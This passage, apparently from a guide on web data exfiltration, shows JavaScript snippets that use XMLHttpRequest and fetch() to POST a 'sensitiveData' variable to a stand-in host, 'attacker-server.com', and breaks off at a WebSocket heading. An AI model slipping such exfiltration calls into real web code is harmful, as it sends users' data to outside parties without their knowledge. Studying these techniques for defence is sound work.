xhr.open('POST', 'https://attacker-server.com/data', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('data=' + sensitiveData);
```
This code uses an XMLHttpRequest to send sensitive data to the attacker's server.

### 2. Fetch API

```javascript
fetch('https://attacker-server.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'data=' + sensitiveData
});
```
This code uses the Fetch API to send sensitive data to the attacker's server.

### 3. WebSocket

```javascript
